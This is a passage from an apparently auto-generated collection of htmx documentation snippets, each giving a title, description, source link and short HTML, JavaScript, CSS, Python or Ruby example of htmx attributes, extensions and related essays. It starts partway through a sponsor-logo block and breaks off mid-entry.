href=\"https://black.host\">\n          <img class=\"dark-invert\"  src=\"/img/blackhost-logo.svg\" alt=\"Black Host\">\n        </a>\n</div>\n<div>\n        <a href=\"https://www.v7n.com/\">\n          <img alt=\"V7N\" class=\"dark-hidden\" src=\"/img/v7n-logo.png\">\n          <img alt=\"V7N\" class=\"dark-visible\" src=\"/img/v7n-logo-dark.png\">\n        </a>\n</div>\n<div>\n      <a data-github-account=\"sekunho\" href=\"https://twitter.com/sekunho_/\"><img src=\"/img/sekun-doggo.jpg\" alt=\"Hiro The Doggo\" style=\"border: 2px solid lightgray; border-radius:20px\"></a>\n</div>\n<div>\n        <a href=\"https://dasfilter.shop/pages/affiliates\">\n          <img class=\"dark-hidden\"  alt=\"Das Filter\" src=\"/img/das-filter.svg\">\n          <img class=\"dark-visible\" alt=\"Das Filter\" src=\"/img/das-filter-dark.svg\">\n        </a>\n</div>\n<div>\n      <a href=\"https://www.pullapprove.com/?utm_campaign=sponsorship&utm_medium=banner&utm_source=htmx\">\n        <img class=\"dark-hidden\" src=\"/img/pullapprove-logo.svg\" alt=\"PullApprove\"/>\n        <img class=\"dark-visible\" src=\"/img/pullapprove-logo-dark.svg\" alt=\"PullApprove\"/>\n      </a>\n</div>\n<div>\n        <a data-github-account=\"transloadit\" href=\" https://transloadit.com/?utm_source=htmx&utm_medium=referral&utm_campaign=sponsorship&utm_content=website/\">\n          <img class=\"dark-hidden\" alt=\"Transloadit\" src=\"/img/logos-transloadit-default.svg\">\n          <img class=\"dark-visible\" alt=\"Transloadit\" src=\"/img/transloadit-logo-dark.svg\">\n        </a>\n</div>\n<div>\n      <a data-github-account=\"uibakery\" href=\"https://uibakery.io\">\n      <img class=\"dark-hidden\" src=\"/img/ui-bakery.svg\" alt=\"UI Bakery\">\n      <img class=\"dark-visible\" src=\"/img/ui-bakery-dark.svg\" alt=\"UI Bakery\"></a>\n</div>\n\n<div>\n    <a data-github-account=\"tracebit-com\" href=\"https://tracebit.com/?utm_source=htmx\">\n      <img class=\"dark-hidden\" alt=\"Tracebit Cloud Canaries\" src=\"/img/tracebit-logo.png\">\n      <img class=\"dark-visbile\" alt=\"Tracebit Cloud Canaries\" src=\"/img/tracebit-logo-dark.png\">\n    </a>\n</div>\n<div>\n      <a data-github-account=\"pubkey\" href=\"https://rxdb.info/?utm_source=sponsor&utm_medium=githubsponsor&utm_campaign=githubsponsor-htmx\">\n        <img src=\"/img/rxdb.svg\" alt=\"RxDB JavaScript Database\"></a>\n</div>\n<div>\n      <a href=\"https://www.ohne-makler.net/\"><img src=\"/img/ohne-makler.svg\" alt=\"Ohne-Makler\" style=\"width:100%;max-width:150px\"></a>\n</div>\n\n\n<div>\n        <a data-github-account=\"cased\" href=\"https://cased.com//\">\n          <img class=\"dark-hidden\" alt=\"Developer friendly DevOps\" src=\"/img/Cased_Logo_DarkBlue.svg\" style=\"width:100%;max-width:250px\">\n          <img class=\"dark-visible\" alt=\"Developer friendly DevOps\" src=\"/img/Cased_Logo_Beige-01.svg\" style=\"width:100%;max-width:250px\">\n        </a>\n</div>\n<div>\n        <a data-github-account=\"llcorg\" href=\"https://www.llc.org/\">\n          <img alt=\"How to start an LLC - a guide from LLC.org, proud open source sponsor\" src=\"/img/llc-org.svg\" style=\"width:100%;max-width:250px\">\n        </a>\n</div>\n\n\n<div>\n        <a data-github-account=\"VPSServerCom\" href=\"https://www.vpsserver.com/\">\n          <img class=\"dark-hidden\" alt=\"VPS Server Hosting in the Cloud: Cost Efficiency\" src=\"/img/vps-server-logo.svg\" style=\"width:100%;max-width:250px\">\n          <img class=\"dark-visible\" alt=\"VPS Server Hosting in the Cloud: Cost Efficiency\" src=\"/img/vps-server-logo-dark.svg\" style=\"width:100%;max-width:250px\">\n        </a>\n</div>\n<div>\n        <a data-github-account=\"appleple\" href=\"https://www.a-blogcms.jp/\">\n          <img src=\"/img/ablogcms_logo.svg\" style=\"width:100%;max-width:250px\">\n        </a>\n</div>\n<div>\n        <a data-github-account=\"CoverageCritic\" alt=\"Find Internet Providers With Broadband Map\" href=\"https://broadbandmap.com/\">\n           <img class=\"dark-hidden\" src=\"/img/BroadbandMapLogo2LineLightMode.png\" style=\"width:100%;max-width:250px\">\n           <img class=\"dark-visible\" src=\"/img/BroadbandMapLogo2LineDarkMode.png\" style=\"width:100%;max-width:250px\">\n        </a>\n</div>\n\n\n<div>\n        <a data-github-account=\"upstatebreaker\" href=\"https://buymybreaker.com/\">\n          <img class=\"dark-hidden\" alt=\"Electrical Equipment - BuyMyBreaker.com\" src=\"/img/bmb-light.svg\" style=\"min-width: 80px\" >\n          <img class=\"dark-visible\" alt=\"Electrical Equipment - BuyMyBreaker.com\" src=\"/img/bmb-dark.svg\" style=\"min-width: 80px\">\n        </a>\n</div>\n<div>\n        <a data-github-account=\"Viralyft\" alt=\"Buy YouTube views\" href=\"https://viralyft.com/buy-youtube-views/\">\n           <img class=\"dark-hidden\" src=\"/img/Viralyft_light.png\" style=\"width:100%;max-width:250px\">\n           <img class=\"dark-visible\" src=\"/img/Viralyft_dark.png\" style=\"width:100%;max-width:250px\">\n        </a>\n</div>\n<div>\n        <a data-github-account=\"Follower24\" alt=\"Follower24\" href=\"https://www.follower24.de/\">\n           <img class=\"dark-hidden\" src=\"/img/follower_light.svg\" style=\"width:100%;max-width:250px\">\n           <img class=\"dark-visible\" src=\"/img/follower_dark.svg\" style=\"width:100%;max-width:250px\">\n        </a>\n</div>\n\n\n<div>\n    <a data-github-account=\"ExchangeRate-API\" alt=\"The Accurate & Reliable Exchange Rate API\" href=\"https://www.exchangerate-api.com\">\n       <img class=\"dark-hidden\" src=\"/img/exchange-rate-api.png\" style=\"width:100%;max-width:250px\">\n       <img class=\"dark-visible\" src=\"/img/exchange-rate-api-dark.png\" style=\"width:100%;max-width:250px\">\n    </a>\n</div>\n<div>\n        <a data-github-account=\"radioplusexperts\" alt=\"Assignment Writing service\" href=\"https://edubirdie.com/do-my-assignment\">\n           <img class=\"dark-hidden\" src=\"/img/edubirdie-light.png\" style=\"width:100%;max-width:250px\">\n           <img class=\"dark-visible\" src=\"/img/edubirdie-dark.png\" style=\"width:100%;max-width:250px\">\n        </a>\n</div>\n</div>\n\n<div style=\"text-align: center;font-style: italic;margin-top: 26px;\">ʕ •ᴥ•ʔ made in montana</div>\n```\n\n----------------------------------------\n\nTITLE: HTMX Tab Example with Target\nDESCRIPTION: This HTML snippet shows a tab structure with the hx-target set to \"this\" and hx-swap set to \"innerHTML\". This configuration means that when a button is clicked, the content retrieved from the server will replace the entire parent element (the div with id=\"tabs\") instead of just the content within the div.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/tabs-hateoas.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"tabs\" hx-target=\"this\" hx-swap=\"innerHTML\">\n\t\t<div class=\"tab-list\" role=\"tablist\">\n\t\t\t<button hx-get=\"/tab1\" class=\"selected\" role=\"tab\" aria-selected=\"true\" aria-controls=\"tab-content\">Tab 1</button>\n\t\t\t<button hx-get=\"/tab2\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 2</button>\n\t\t\t<button hx-get=\"/tab3\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 3</button>\n\t\t</div>\n\t\t<div id=\"tab-content\" role=\"tabpanel\" class=\"tab-content\">\n\t\t\tCommodo normcore truffaut VHS duis gluten-free keffiyeh iPhone taxidermy godard ramps anim pour-over.\n\t\t\tPitchfork vegan mollit umami quinoa aute aliquip kinfolk eiusmod live-edge cardigan ipsum locavore.\n\t\t\tPolaroid duis occaecat narwhal small batch food truck.\n\t\t\tPBR&B venmo shaman small batch you probably haven't heard of them hot chicken readymade.\n\t\t\tEnim tousled cliche woke, typewriter single-origin coffee hella culpa.\n\t\t\tArt party readymade 90's, asymmetrical hell of fingerstache ipsum.\n\t\t</div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Styling Webring Elements with CSS\nDESCRIPTION: This CSS snippet defines the visual style for the webring elements. It hides the main page's header and footer, sets the font family for the webring div, and hides the 'built-with-tds' class on smaller screens to optimize for mobile viewing.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/webring.md#_snippet_0\n\nLANGUAGE: CSS\nCODE:\n```\n <style>\n  h1 {\n    display: none;\n  }\n  footer {\n    display: none;\n  }\n  #webring-div {\n    font-family: Times New Roman;\n  }\n\n@media only screen and (max-width: 720px) {\n  .built-with-tds {\n     display:none;\n  }\n}\n</style>\n```\n\n----------------------------------------\n\nTITLE: Fake Server-Side Data Generation (JavaScript)\nDESCRIPTION: This JavaScript code simulates a server-side data store and API endpoint for generating contact data. The `dataStore` object has a `contactsForPage` function that creates a list of 20 contact objects with randomized ID hashes. This simulates fetching contact data for a specific page number.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/infinite-scroll.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n var dataStore = function(){\n      var contactId = 9;\n      function generateContact() {\n        contactId++;\n        var idHash = \"\";\n        var possible = \"ABCDEFG0123456789\";\n        for( var i=0; i < 10; i++ ) idHash += possible.charAt(Math.floor(Math.random() * possible.length));\n        return { name: \"Agent Smith\", email: \"void\" + contactId + \"@null.org\", id: idHash }\n      }\n      return {\n        contactsForPage : function(page) {\n          var vals = [];\n          for( var i=0; i < 20; i++ ){\n            vals.push(generateContact());\n          }\n          return vals;\n        }\n      }\n    }()\n```\n\n----------------------------------------\n\nTITLE: hx-sync Drop Example (HTML)\nDESCRIPTION: This example demonstrates using hx-sync with the 'drop' strategy to prioritize the validation request over the submit request. If a validation request is in flight, the form cannot be submitted.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-sync.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<form hx-post=\"/store\">\n    <input id=\"title\" name=\"title\" type=\"text\" \n        hx-post=\"/validate\" \n        hx-trigger=\"change\"\n        hx-sync=\"closest form:drop\"\n    >\n    <button type=\"submit\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: HTML Template Including Archive UI\nDESCRIPTION: This example demonstrates decomposing the template by including a separate template file for the archive UI. The `archive-ui.html` template contains the logic for displaying the \"Archive\" or \"Unarchive\" button.  This approach separates the archive feature's UI logic into its own file, potentially making the main template cleaner but reducing the visibility of the feature's implementation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/template-fragments.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<html>\n    <body>\n        <div hx-target=\"this\">\n          #include archive-ui.html\n        </div>\n        <h3>Contact</h3>\n        <p>${contact.email}</p>\n    </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Deprecated hx-on Syntax in HTML\nDESCRIPTION: Shows the deprecated syntax of the `hx-on` attribute, which involves specifying the event name and script separated by colons within a single attribute value.  This syntax is not recommended for new implementations.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-on.md#_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-get=\"/info\" hx-on=\"htmx:beforeRequest: alert('Making a request!')\">\n    Get Info!\n</button>\n```\n\n----------------------------------------\n\nTITLE: Conditional CSS Styling based on User Preferences\nDESCRIPTION: This code snippet illustrates how to control CSS styles based on user input, limiting the choices to predefined safe options. By using an `if` statement, the `favorite_color` can be set by the user, but only red or blue are applied, preventing arbitrary CSS injection. This approach enhances security by restricting user customization to a predefined set of options.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_14\n\nLANGUAGE: CSS\nCODE:\n```\n{% if user.favorite_color === 'red' %}\nh1 { color: 'red'; }\n{% else %}\nh1 { color: 'blue'; }\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: JSON Example with Hypermedia Controls (Links)\nDESCRIPTION: This JSON snippet extends the previous example by adding hypermedia controls in the form of \"links\". These links provide URLs for related actions such as deposits, withdrawals, and transfers. While adding links introduces hypermedia controls, it is not sufficient for a fully RESTful system without a proper hypermedia client.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-clients.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"account\": {\n    \"account_number\": 12345,\n    \"balance\": {\n      \"currency\": \"usd\",\n      \"value\": 50.00\n    },\n    \"status\": \"open\",\n    \"links\": {\n      \"deposits\": \"/accounts/12345/deposits\",\n      \"withdrawals\": \"/accounts/12345/withdrawals\",\n      \"transfers\": \"/accounts/12345/transfers\",\n      \"close-requests\": \"/accounts/12345/close-requests\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Toggling CSS Class with Scripting HTML Examples\nDESCRIPTION: This example showcases three different methods for toggling a CSS class on a button click: hyperscript, Alpine.js, and Vanilla JavaScript. Each snippet achieves the same functionality of adding or removing the 'red-border' class. These illustrate the Code-On-Demand concept within HDA, embedding scripting directly into HTML for enhanced interactivity.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-driven-applications.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<!-- hyperscript -->\n<button _=\"on click toggle .red-border\">\n  Toggle Class\n</button>\n\n<!-- Alpine JS -->\n<button @click=\"open = !open\" :class=\"{'red-border' : open, '' : !open}\">\n  Toggle Class\n</button>\n\n<!-- VanillaJS -->\n<button onclick=\"this.classList.toggle('red-border')\">\n  Toggle Class\n</button>\n```\n\n----------------------------------------\n\nTITLE: Installing htmx and htmx-1-compat via CDN - HTML\nDESCRIPTION: This HTML snippet demonstrates how to install htmx core and the htmx-1-compat extension using CDNs. It includes integrity checks for security and specifies the crossorigin attribute. The `hx-ext` attribute on the body enables the extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/htmx-1-compat.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n    <script src=\"https://unpkg.com/htmx.org@2.0.4\" integrity=\"sha384-HGfztofotfshcF7+8n44JQL2oJmowVChPTg48S+jvZoztPfvwD79OC/LTtG6dMp+\" crossorigin=\"anonymous\"></script>\n    <script src=\"https://unpkg.com/htmx-ext-htmx-1-compat@2.0.0\" integrity=\"sha384-lcvVWaNjF5zPPUeeWmC0OkJ2MLqoWLlkAabuGm+EuMSTfGo5WRyHrNaAp0cJr9Pg\" crossorigin=\"anonymous\"></script>\n</head>\n<body hx-ext=\"htmx-1-compat\">\n...\n\n```\n\n----------------------------------------\n\nTITLE: React Component with Embedded HTML\nDESCRIPTION: This JavaScript snippet demonstrates a React component that embeds HTML. The JavaScript is the primary language, with HTML used for UI description.  The `onClick` event handler is bound to a method that controls the component's behavior.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-friendly-scripting.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nclass Button extends React.Component {\n    constructor(props) {\n        // ...\n    }\n    toggleVisibilityOnNextSection() {\n        // ...\n    }\n    render() {\n        return <button onClick={this.toggleVisibilityOnNextSection}>{this.props.text}</button>;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Content Security Policy in HTML\nDESCRIPTION: This HTML snippet shows how to set a basic Content Security Policy (CSP) using a meta tag. It restricts the browser to only allow connections to the origin domain ('self'). This is a security measure to prevent cross-site scripting (XSS) attacks.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_57\n\nLANGUAGE: HTML\nCODE:\n```\n    <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self';\">\n```\n\n----------------------------------------\n\nTITLE: Swapping Content with htmx API\nDESCRIPTION: Illustrates how to swap content using the new `swap` method in htmx 2.x. This snippet defines the HTML content to be swapped, retrieves the target element using `api.getTarget()`, gets the swap specification with `api.getSwapSpecification()`, and finally performs the swap using `api.swap()`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-htmx-1.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n  let content = \"<div>Hello world</div>\"; // this is HTML that will be swapped into target\n  let target = api.getTarget(child);\n  let swapSpec = api.getSwapSpecification(child);\n  api.swap(target, content, swapSpec);\n```\n\n----------------------------------------\n\nTITLE: HTML hx-confirm unset example\nDESCRIPTION: Demonstrates disabling hx-confirm on a per element basis. The cancel button will not show a confirm dialog.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_33\n\nLANGUAGE: html\nCODE:\n```\n<div hx-confirm=\"Are you sure?\">\n    <button hx-delete=\"/account\">\n        Delete My Account\n    </button>\n    <button hx-put=\"/account\">\n        Update My Account\n    </button>\n    <button hx-confirm=\"unset\" hx-get=\"/\">\n        Cancel\n    </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Using hx-select with htmx\nDESCRIPTION: This code snippet demonstrates how to use the `hx-select` attribute in htmx to select a specific element from the response of a GET request and swap it into the DOM. The `hx-get` attribute triggers a GET request to `/info`. The `hx-select` attribute specifies the CSS selector `#info-detail` to select the element with the id `info-detail` from the response. The `hx-swap` attribute is set to `outerHTML`, which replaces the entire button element with the selected content.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-select.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div>\n    <button hx-get=\"/info\" hx-select=\"#info-detail\" hx-swap=\"outerHTML\">\n        Get Info!\n    </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Importing htmx and htmx-1-compat - JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to import the htmx core library and the htmx-1-compat extension in a JavaScript project when using a bundler like Webpack or Rollup. It assumes both packages have been installed via npm.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/htmx-1-compat.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport `htmx.org`;\nimport `htmx-ext-htmx-1-compat`; \n\n```\n\n----------------------------------------\n\nTITLE: Chrome: ChromeContentRendererClient::RenderFrameCreated() Function Analysis (C++)\nDESCRIPTION: This C++ function from Google Chrome is responsible for handling the creation of render frames.  It's a large function (>200 LOC) in a complex codebase that tackles the challenge of being a general-purpose hypermedia client. It shows that 'clean' code principles aren't strictly followed in real-world projects solving difficult problems.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/codin-dirty.md#_snippet_2\n\nLANGUAGE: cpp\nCODE:\n```\nRefer to: https://github.com/chromium/chromium/blob/6fdb8fdff0ba83db148ff2f87105bc95e5a4ceec/chrome/renderer/chrome_content_renderer_client.cc#L591\n```\n\n----------------------------------------\n\nTITLE: Indicator inside the button (HTML)\nDESCRIPTION: This HTML snippet shows how to display the indicator without the `hx-indicator` attribute.  Since `htmx-request` is added to the element causing the request, putting the indicator (the image with `htmx-indicator` class) inside the button allows it to show without explicitly calling it out with `hx-indicator`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-indicator.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-post=\"/example\">\n    Post It!\n   <img  class=\"htmx-indicator\" src=\"/img/bars.svg\"/>\n</button>\n```\n\n----------------------------------------\n\nTITLE: JSON Response with Account Status\nDESCRIPTION: This snippet displays a JSON response containing account information and a status field.  It highlights the need for the client to understand the meaning of the 'status' field and the URLs to use for resource manipulation, emphasizing the lack of hypermedia-driven interaction.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hateoas.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nHTTP/1.1 200 OK\n\n{\n    \"account\": {\n        \"account_number\": 12345,\n        \"balance\": {\n            \"currency\": \"usd\",\n            \"value\": -50.00\n        },\n        \"status\": \"overdrawn\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: CSS Styling - Fade Out On Swap\nDESCRIPTION: Defines the CSS style for the fade-out animation. When the `htmx-swapping` class is added to an element with the `fade-me-out` class, the opacity is set to 0, triggering a 1-second ease-out transition.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_4\n\nLANGUAGE: css\nCODE:\n```\n.fade-me-out.htmx-swapping {\n  opacity: 0;\n  transition: opacity 1s ease-out;\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Disabling htmx Attribute Inheritance\nDESCRIPTION: Shows how to disable attribute inheritance in htmx using the `htmx.config.disableInheritance` configuration variable.  This configuration is set via a `<meta>` tag.  Disabling inheritance can improve locality of behavior at the cost of DRYness.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/QUIRKS.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n  <meta name=\"htmx-config\" content='{\"disableInheritance\":true}'>\n```\n\n----------------------------------------\n\nTITLE: Searching Contacts - JavaScript\nDESCRIPTION: This JavaScript code defines a function called 'findContactsMatching' that searches an array of contact data for matches based on a given string. The function takes a string as input and returns an array of contact objects that contain the string (case-insensitive) in their 'FirstName', 'LastName', or 'Email' fields. It uses the 'toLowerCase()' and 'indexOf()' methods for case-insensitive searching.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/active-search.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n          ];\n          return {\n            findContactsMatching : function(str) {\n              var result = [];\n              var s = str.toLowerCase();\n              for (var i = 0; i < data.length; i++) {\n                var c = data[i];\n                if(c['FirstName'].toLowerCase().indexOf(s) >= 0 || c['LastName'].toLowerCase().indexOf(s) >= 0 || c['Email'].toLowerCase().indexOf(s) >= 0) {\n                  result.push(c)\n                }\n              }\n              return result;\n            }\n          }\n        }()\n\n```\n\n----------------------------------------\n\nTITLE: Display Contact Details with HTMX\nDESCRIPTION: This HTML snippet displays the contact details and includes a button that, when clicked, fetches the editing UI from the `/contact/1/edit` endpoint using an HTMX GET request. The `hx-target` attribute specifies that the response should replace the current div, and `hx-swap` dictates the `outerHTML` should be replaced.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/click-to-edit.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div hx-target=\"this\" hx-swap=\"outerHTML\">\n    <div><label>First Name</label>: Joe</div>\n    <div><label>Last Name</label>: Blow</div>\n    <div><label>Email</label>: joe@blow.com</div>\n    <button hx-get=\"/contact/1/edit\" class=\"btn primary\">\n    Click To Edit\n    </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Override EventSource Creation - htmx.createEventSource - JavaScript\nDESCRIPTION: This code snippet shows how to override the default `EventSource` creation function using `htmx.createEventSource`.  This can be used to customize the setup of Server Sent Event connections.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n// override SSE event sources to not use credentials\nhtmx.createEventSource = function(url) {\n  return new EventSource(url, {withCredentials:false});\n};\n```\n\n----------------------------------------\n\nTITLE: HTML Table Template Generation\nDESCRIPTION: These JavaScript functions generate HTML templates for the table and table rows. `tableTemplate` creates the initial table structure, `rowsTemplate` generates the rows of contact data, and `loadMoreRow` creates the \"Load More\" button row.  The templates use backticks for string interpolation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/click-to-load.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n    function tableTemplate(contacts) {\n        return `<table><thead><tr><th>Name</th><th>Email</th><th>ID</th></tr></thead><tbody>\n                ${rowsTemplate(1, contacts)}\n                </tbody></table>`\n    }\n\n    function rowsTemplate(page, contacts) {\n      var txt = \"\";\n      for (var i = 0; i < contacts.length; i++) {\n        var c = contacts[i];\n        txt += `<tr><td>${c.name}</td><td>${c.email}</td><td>${c.id}</td></tr>\\n`;\n      }\n      txt += loadMoreRow(page);\n      return txt;\n    }\n\n    function loadMoreRow(page) {\n      return `<tr id=\"replaceMe\">\n  <td colspan=\"3\">\n    <center>\n      <button class='btn primary' hx-get=\"/contacts/?page=${page + 1}\"\n                       hx-target=\"#replaceMe\"\n                       hx-swap=\"outerHTML\">\n         Load More Agents... <img class=\"htmx-indicator\" src=\"/img/bars.svg\">\n       </button>\n    </center>\n  </td>\n</tr>`;\n    }\n```\n\n----------------------------------------\n\nTITLE: Copy Text for HN with _ attribute\nDESCRIPTION: This code snippet, using the _ attribute, copies the inner text of the previous div to the clipboard, but first formats it for Hacker News by adding two spaces to the beginning of each line. It then writes the modified text to the clipboard, updates an output element with 'Copied for HN!', waits for 2 seconds, and clears the output element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/rest-copypasta.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\non click\n             get the innerText of the previous <div/>\n             get result.split('\\n').map( \\ l -> '  ' + l ).join('\\n')\n             then writeText(the result) with the navigator's clipboard\n             put 'Copied for HN!' into the next <output/>\n             wait 2s\n             put '' into the next <output/>\n```\n\n----------------------------------------\n\nTITLE: Initial HTML Content for CSS Transition Example - HTML\nDESCRIPTION: This is the initial HTML content that will be replaced by htmx.  It's a simple div with an id.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_24\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"div1\">Original Content</div>\n```\n\n----------------------------------------\n\nTITLE: Filtering Events with Javascript Expression - HTML\nDESCRIPTION: This code snippet demonstrates event filtering using a JavaScript expression within the hx-trigger attribute. The AJAX request to '/clicked' is only triggered if the 'ctrlKey' property of the click event is true (i.e., the control key is pressed during the click). eval() is required for this to function correctly.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-trigger.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/clicked\" hx-trigger=\"click[ctrlKey]\">Control Click Me</div>\n```\n\n----------------------------------------\n\nTITLE: Rate Limiting JSON API with Flask-Limiter\nDESCRIPTION: This Python code snippet demonstrates how to add rate limiting to a JSON API endpoint using the Flask-Limiter library. It applies a limit of one request per second to the `/api/v1/contacts` endpoint. The snippet depends on the Flask framework, Flask-Limiter, and a `Contact` model.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/mvc.md#_snippet_2\n\nLANGUAGE: Python\nCODE:\n```\n@app.route(\"/api/v1/contacts\")\n@limiter.limit(\"1 per second\")\ndef contacts():\n    contacts = Contact.all(page=request.args.get('page', default=0, type=int))\n    return jsonify(contacts=contacts)\n```\n\n----------------------------------------\n\nTITLE: Simulating Server Responses for HTMX Requests\nDESCRIPTION: This JavaScript code simulates server responses for the HTMX requests. It uses the `this.server.respondWith` function to intercept the `/new-content` and `/original-content` GET requests and provide predefined responses.  It uses `htmx.find` to store the original content. This allows the demo to function without a real backend server.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/view-transitions.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n    var originalContent = htmx.find(\".sample-transition\").innerHTML;\n\n    this.server.respondWith(\"GET\", \"/new-content\", function(xhr){\n        xhr.respond(200,  {}, \"<h1>New Content</h1> <button hx-get='/original-content' hx-swap='innerHTML transition:true' hx-target='closest div'>Restore It! </button>\")\n    });\n\n    this.server.respondWith(\"GET\", \"/original-content\", function(xhr){\n        xhr.respond(200,  {}, originalContent)\n    });\n```\n\n----------------------------------------\n\nTITLE: JavaScript Handler - Color Throb Demo\nDESCRIPTION: This JavaScript code defines a handler for the `/colors` endpoint. It cycles through an array of colors and returns a new `div` element with the updated color, which htmx then uses to replace the existing element, creating the color throbbing effect.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nvar colors = ['blue', 'green', 'orange', 'red'];\nonGet(\"/colors\", function () {\n  var color = colors.shift();\n  colors.push(color);\n  return '<div id=\"color-demo\" hx-get=\"/colors\" hx-swap=\"outerHTML\" class=\"smooth\" hx-trigger=\"every 1s\" style=\"color:' + color + '\">\\n'+\n         '  Color Swap Demo\\n'+\n         '</div>\\n'\n});\n```\n\n----------------------------------------\n\nTITLE: Rails Controller with Content Negotiation\nDESCRIPTION: This Ruby code snippet demonstrates how to use the `respond_to` helper in a Rails controller to provide both HTML and JSON responses for the same endpoint. It retrieves contacts and renders either HTML or JSON based on the `Accept` header of the request. Dependencies: Rails framework.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/why-tend-not-to-use-content-negotiation.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\ndef index\n  @contacts = Contacts.all\n\n  respond_to do |format|\n    format.html # default rendering logic\n    format.json { render json: @contacts }\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: HX-Trigger header example - htmx\nDESCRIPTION: This text snippet shows the HX-Trigger header in the POST /contacts response. When received, this will trigger a custom 'newContact' event on the client.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/update-other-content.md#_snippet_4\n\nLANGUAGE: txt\nCODE:\n```\nHX-Trigger:newContact\n```\n\n----------------------------------------\n\nTITLE: Installing htmx Preload Extension via npm\nDESCRIPTION: This command shows how to install the htmx preload extension using npm, a package manager for JavaScript.  This method is suitable for projects that use npm for dependency management and build processes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/preload.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install htmx-ext-preload\n```\n\n----------------------------------------\n\nTITLE: HTML Button Element for jQuery AJAX Example\nDESCRIPTION: This code snippet shows the HTML button element used in conjunction with the jQuery AJAX example. It has an ID that is targeted by the jQuery code to attach the click event and trigger the AJAX request. Alone, the button's behavior is not obvious, violating the principle of Locality of Behaviour.\nSOURCE: 